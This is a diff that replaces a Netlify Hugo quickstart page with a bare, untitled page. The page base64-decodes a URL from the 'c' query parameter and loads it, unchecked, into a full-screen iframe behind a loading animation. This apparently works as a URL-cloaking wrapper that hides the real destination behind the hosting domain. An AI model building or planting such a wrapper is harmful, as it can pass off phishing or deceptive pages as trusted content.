@@ -1,31 +1,212 @@
-{{ define "main" }}
-<svg id="background" width='1728' height='1235' viewBox="0 0 1728 1235" fill='none' xmlns='http://www.w3.org/2000/svg'><g opacity='0.75' filter='url(#filter0_f_39_143)'><circle cy='1000' r='264' fill='url(#paint0_linear_39_143)'/></g><g opacity='0.65' filter='url(#filter1_f_39_143)'><circle cx='1720' cy='264' r='379' fill='url(#paint1_linear_39_143)'/></g><defs><filter id='filter0_f_39_143' x='-485' y='515' width='970' height='970' filterUnits='userSpaceOnUse' color-interpolation-filters='sRGB'><feFlood flood-opacity='0' result='BackgroundImageFix'/><feBlend mode='normal' in='SourceGraphic' in2='BackgroundImageFix' result='shape'/><feGaussianBlur stdDeviation='110.5' result='effect1_foregroundBlur_39_143'/></filter><filter id='filter1_f_39_143' x='1120' y='-336' width='1200' height='1200' filterUnits='userSpaceOnUse' color-interpolation-filters='sRGB'><feFlood flood-opacity='0' result='BackgroundImageFix'/><feBlend mode='normal' in='SourceGraphic' in2='BackgroundImageFix' result='shape'/><feGaussianBlur stdDeviation='110.5' result='effect1_foregroundBlur_39_143'/></filter><linearGradient id='paint0_linear_39_143' x1='196.5' y1='902' x2='-2.55853e-05' y2='1264' gradientUnits='userSpaceOnUse'><stop stop-color="var(--bttm-left-blur-1)"/><stop offset='1' stop-color="var(--bttm-left-blur-2)"/></linearGradient><linearGradient id='paint1_linear_39_143' x1='1720' y1='-115' x2='1720' y2='643' gradientUnits='userSpaceOnUse'><stop stop-color="var(--top-right-blur-1)"/><stop offset='1' stop-color="var(--top-right-blur-2)" /></linearGradient></defs></svg>     
-<div id="content">
-  <div class="header">
-    <h1>Quickstart Template</h1>
-    <div class="logo">
-      <img src="https://user-images.githubusercontent.com/43764894/223559747-e9d7f19d-91bf-46a9-a0cb-8d6a40d3cfa3.png" alt="netlify + hugo banner" role="presentation">
-    </div>
-    <h2>
-      This is a bare-bones Hugo project that has everything you need to quickly deploy it to Netlify
-    </h2>
-    <div class="bttns">
-      <a href="https://app.netlify.com/start/deploy?repository=https://github.com/netlify-templates/hugo-quickstart" class="bttn primary">Deploy to Netlify</a>
-      <a href="https://github.com/netlify-templates/hugo-quickstart" class="bttn secondary">View Repo</a>
-    </div>
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+  <meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" name="viewport">
+  <meta content="yes" name="apple-mobile-web-app-capable">
+  <meta content="yes" name="apple-touch-fullscreen">
+  <meta content="black" name="apple-mobile-web-app-status-bar-style">
+  <meta content="320" name="MobileOptimized">
+  <title></title>
+  <style>
+   .container {
+      width: 100px;
+      height: 100px;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+
+   .dot {
+      width: 15px;
+      height: 15px;
+      border-radius: 50%;
+      background-color: #000;
+      position: absolute;
+      top: 0;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      margin: auto;
+    }
+
+   .dot-3 {
+      background-color: #f74d75;
+    }
+
+   .dot-2 {
+      background-color: #10beae;
+    }
+
+   .dot-1 {
+      background-color: #ffe386;
+    }
+
+   .dot-3 {
+      background-color: #f74d75;
+      animation: dot-3-move 2s ease infinite;
+    }
+
+    @keyframes dot-3-move {
+      20% {
+        transform: scale(1)
+      }
+
+      45% {
+        transform: translateY(-18px) scale(.45)
+      }
+
+      60% {
+        transform: translateY(-25px) scale(.45)
+      }
+
+      80% {
+        transform: translateY(-25px) scale(.45)
+      }
+
+      100% {
+        transform: translateY(0px) scale(1)
+      }
+    }
+
+   .dot-2 {
+      background-color: #10beae;
+      animation: dot-2-move 2s ease infinite;
+    }
+
+   .dot-1 {
+      background-color: #ffe386;
+      animation: dot-1-move 2s ease infinite;
+    }
+
+    @keyframes dot-2-move {
+      20% {
+        transform: scale(1)
+      }
+
+      45% {
+        transform: translate(-16px, 12px) scale(.45)
+      }
+
+      60% {
+        transform: translate(-20px, 15px) scale(.45)
+      }
+
+      80% {
+        transform: translate(-20px, 15px) scale(.45)
+      }
+
+      100% {
+        transform: translateY(0px) scale(1)
+      }
+    }
+
+    @keyframes dot-1-move {
+      20% {
+        transform: scale(1)
+      }
+
+      45% {
+        transform: translate(16px, 12px) scale(.45)
+      }
+
+      60% {
+        transform: translate(20px, 15px) scale(.45)
+      }
+
+      80% {
+        transform: translate(20px, 15px) scale(.45)
+      }
+
+      100% {
+        transform: translateY(0px) scale(1)
+      }
+    }
+
+   .container {
+      width: 100px;
+      height: 100px;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      animation: rotate-move 2s ease-in-out infinite;
+    }
+
+    @keyframes rotate-move {
+      55% {
+        transform: translate(-50%, -50%) rotate(0deg)
+      }
+
+      80% {
+        transform: translate(-50%, -50%) rotate(360deg)
+      }
+
+      100% {
+        transform: translate(-50%, -50%) rotate(360deg)
+      }
+    }
+
+   .content {
+      height: 100%;
+      width: 100%;
+      position: fixed;
+      left: -2px;
+      top: -2px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container">
+    <div class="dot dot-1"></div>
+    <div class="dot dot-2"></div>
+    <div class="dot dot-3"></div>
   </div>
-  <div class="resource-list">
-    <ul>
-      <li>
-        <a href="https://ntl.fyi/3xXydGk">Netlify Blog: Hugo posts</a>
-        </li>
-      <li>
-        <a href="https://ntl.fyi/3P9w1mr">Hugo on Netlify Docs</a>
-      </li>
-      <li>
-        <a href="https://gohugo.io/documentation/">Hugo Docs</a>
-      </li>
-    </ul>
-  </div>
-</div>
-{{ end }}
+  <script>
+    var urlParams = new URLSearchParams(window.location.search);
+    var encodedParam = urlParams.get('c');
+    var tureurl = atob(encodedParam);
+    if (tureurl.includes("http")) {
+      // 正确获取元素的方式，使用querySelector获取类名为container的元素
+      var square = document.querySelector('.container');
+      var iframe = document.createElement('iframe');
+      iframe.classList.add('content');
+      iframe.src = tureurl;
+      // 监听iframe的load事件，当加载完成时隐藏加载动画元素
+      iframe.addEventListener('load', function () {
+        square.style.display = "none";
+      });
+      document.body.appendChild(iframe);
+      console.log(tureurl);
+    } else {
+      console.log("nourls");
+    }
+  </script>
+  <script>
+    var firefox = navigator.userAgent.indexOf('Firefox')!= -1;
+
+    function MouseWheel(e, doc) {
+      e.preventDefault && e.preventDefault(), e.returnValue = false;
+      var up = firefox && e.detail < 0 || e.wheelDelta > 0;
+      doc.body.scrollTop = doc.documentElement.scrollTop += up? -50 : 50;
+    }
+
+    function bindMouseWhee(ifr) {
+      try {
+        var doc = ifr.contentWindow.document;
+        firefox? doc.addEventListener('DOMMouseScroll', function (e) {
+          MouseWheel(e, doc)
+        }, false) : (doc.onmousewheel = function (e) {
+          MouseWheel(e || ifr.contentWindow.event, doc)
+        });
+      } catch (e) {
+        alert('跨域无法获取iframe加载document' + e);
+      }
+    }
+  </script>
+</body>
+
+</html>
